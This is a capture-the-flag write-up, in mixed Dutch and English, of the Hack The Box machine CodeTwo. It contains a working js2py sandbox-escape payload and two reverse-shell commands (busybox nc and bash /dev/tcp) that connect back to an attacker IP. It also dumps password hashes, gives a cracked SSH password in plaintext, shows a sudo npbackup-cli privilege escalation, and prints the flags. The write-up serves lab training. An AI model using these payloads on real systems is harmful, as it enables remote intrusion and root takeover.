# Initial Enumeration

## Port Scanning

### Full Port scan

As always, I will start with a full port scan. With this we will start to see what ports are open on this ip address.

```
┌──(kali㉿kali)-[~/HTB/CodeTwo]
└─$ nmap 10.129.222.172 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-18 12:34 CEST
Nmap scan report for 10.129.222.172
Host is up (0.018s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
8000/tcp open  http-alt

Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds
```
### Detailed port scan

At the detailed port scan go to get more information from the services which are open on the ip address.

```
┌──(kali㉿kali)-[~/HTB/CodeTwo]
└─$ nmap -p22,8000 -sCV 10.129.222.172 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-18 12:36 CEST
Nmap scan report for 10.129.222.172
Host is up (0.017s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a0:47:b4:0c:69:67:93:3a:f9:b4:5d:b3:2f:bc:9e:23 (RSA)
|   256 7d:44:3f:f1:b1:e2:bb:3d:91:d5:da:58:0f:51:e5:ad (ECDSA)
|_  256 f1:6b:1d:36:18:06:7a:05:3f:07:57:e1:ef:86:b4:85 (ED25519)
8000/tcp open  http    Gunicorn 20.0.4
|_http-server-header: gunicorn/20.0.4
|_http-title: Welcome to CodeTwo
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Nu dat we weten dat er een webpagina wordt gehost op pagina 8000, zullen we een keer gaan kijken wat we op deze pagina kunnen vinden.

![[Pasted image 20250818124006.png]]

Ik zal als eerst de applicatie gaan downloaden. We gaan de zojuist gedownloade app.zip file gaan unzippen.

```
┌──(kali㉿kali)-[~/HTB/CodeTwo]
└─$ unzip app.zip             
Archive:  app.zip
   creating: app/
   creating: app/templates/
  inflating: app/templates/login.html  
  inflating: app/templates/dashboard.html  
  inflating: app/templates/reviews.html  
  inflating: app/templates/register.html  
  inflating: app/templates/index.html  
  inflating: app/templates/base.html  
  inflating: app/requirements.txt    
   creating: app/static/
   creating: app/static/js/
  inflating: app/static/js/script.js  
   creating: app/static/css/
  inflating: app/static/css/styles.css  
  inflating: app/app.py              
   creating: app/instance/
  inflating: app/instance/users.db
```

Binnen deze kan je zien de requirements.txt file. Binnen deze file ben ik gaan zien dat de applicatie op `js2py==0.74` draait en ik zal hiervoor dus een exploit gaan zoeken op het internet. Ik ben hierbij op de volgende github url gekomen. https://github.com/pyload/pyload/security/advisories/GHSA-r9pp-r4xf-597r

Er was niets te vinden in de unzipped folder, dus ben ik een account gaan aanmaken zodat ik erna kan gaan aanloggen.

![[Pasted image 20250818123932.png]]

Nu kunnen we gaan inloggen op de website. Daar zal je zien dat je code kunt laten runnen. Wat als we nu de code zullen gaan gebruiken die we gevonden hebben uit de exploit en deze zullen gaan uploaden met een listener voor de connectie op te vangen. De code die dat ik heb gebruikt voor de connectie tot stand te brengen is de volgende code. Het let cmd commando kan je zelf ook gaan uitzoeken door gebruik te maken van de volgende url https://www.revshells.com/. Op deze url kan je verschillende RCE code maken.

```
let cmd = "busybox nc 10.10.16.50 5555 -e bash"
let hacked, bymarve, n11
let getattr, obj

hacked = Object.getOwnPropertyNames({})
bymarve = hacked.__getattribute__
n11 = bymarve("__getattribute__")
obj = n11("__class__").__base__
getattr = obj.__getattribute__

function findpopen(o) {
    let result;
    for(let i in o.__subclasses__()) {
        let item = o.__subclasses__()[i]
        if(item.__module__ == "subprocess" && item.__name__ == "Popen") {
            return item
        }
        if(item.__name__ != "type" && (result = findpopen(item))) {
            return result
        }
    }
}

n11 = findpopen(obj)(cmd, -1, null, -1, -1, -1, null, null, true).communicate()
console.log(n11)
function f() {
    return n11
}
```

Zoals je nu kunt zien hebben we een connectie met de server

```
┌──(kali㉿kali)-[~/HTB/CodeTwo]
└─$ nc -lvnp 5555
listening on [any] 5555 ...
connect to [10.10.16.50] from (UNKNOWN) [10.129.148.49] 37782
python3 -c 'import pty;pty.spawn("/bin/bash")'
app@codetwo:~/app$
```

Daar kan je ook de users.db file gaan downloaden. Ik ben gaan kijken of dat er in deze file geen users en hashes zijn.

```
┌──(kali㉿kali)-[~/HTB/CodeTwo]
└─$ sqlite3 users.db
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
sqlite> .tables
code_snippet  user        
sqlite> SELECT * from user
   ...> 
   ...> ;
1|marco|649c9d65a206a75f5abe509fe128bce5
2|app|a97588c0e2fa3a024876339e27aeb42e
3|test|098f6bcd4621d373cade4e832627b4f6
4|test2|ad0234829205b9033196ba818f7a872b
```

We gaan nu de hash van marco proberen cracken zodat we deze kunnen gaan gebruiken voor de ssh connectie optezetten. Ik ben het password van de user marco gaan achterhalen door gebruik te maken van CrackStation. https://crackstation.net/

![[Pasted image 20250820202903.png]]

Nu zal ik gaan inloggen als de user marco.

| Username | Password           |
| -------- | ------------------ |
| marco    | sweetangelbabylove |

```
┌──(kali㉿kali)-[~/HTB/CodeTwo]
└─$ ssh marco@codetwo.htb
The authenticity of host 'codetwo.htb (10.129.148.49)' can't be established.
ED25519 key fingerprint is SHA256:KGKFyaW9Pm7DDxZe/A8oi/0hkygmBMA8Y33zxkEjcD4.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'codetwo.htb' (ED25519) to the list of known hosts.
marco@codetwo.htb's password: sweetangelbabylove

Last login: Wed Aug 20 18:30:26 2025 from 10.10.16.50
marco@codetwo:~$
```

Hier hebben we nu de user flag.

```
marco@codetwo:~$ cat user.txt 
cd60eeca1b99f3c46142f6ebb3f9497e
```

Nu dat we zijn ingelogged ben ik gaan kijken of dat ik het sudo -l commando ni kon gebruiken. Hier kan je zien dat je geen root password nodig hebt binnen het volgende path `/usr/local/bin/npbackup-cli.

```
marco@codetwo:~$ sudo -l
Matching Defaults entries for marco on codetwo:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User marco may run the following commands on codetwo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

Aanmaken van rce file --> deze store in de marco folder --> Execute rechten geven aan de file zodat we deze kunnen uitvoeren.

```
marco@codetwo:~$ echo -e '#!/bin/sh\nexec /bin/bash -c "bash -i >& /dev/tcp/10.10.16.50/4444 0>&1"' > /home/marco/root
marco@codetwo:~$ chmod +x /home/marco/root
```


```
marco@codetwo:~$ sudo /usr/local/bin/npbackup-cli --config /home/marco/npbackup.conf --external-backend-binary=/home/marco/root -b --repo-name default
2025-08-20 18:47:29,518 :: INFO :: npbackup 3.0.1-linux-UnknownBuildType-x64-legacy-public-3.8-i 2025032101 - Copyright (C) 2022-2025 NetInvent running as root
2025-08-20 18:47:29,548 :: INFO :: Loaded config 4E3B3BFD in /home/marco/npbackup.conf

┌──(kali㉿kali)-[~/HTB/CodeTwo]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.50] from (UNKNOWN) [10.129.148.49] 50128
root@codetwo:/home/marco# 
```

Root flag kunnen bemachtigen

```
root@codetwo:~# cat root.txt
cat root.txt
d1337d6cb3f6be8a9abdb3d131cfb101
```

![[Pasted image 20250820205115.png]]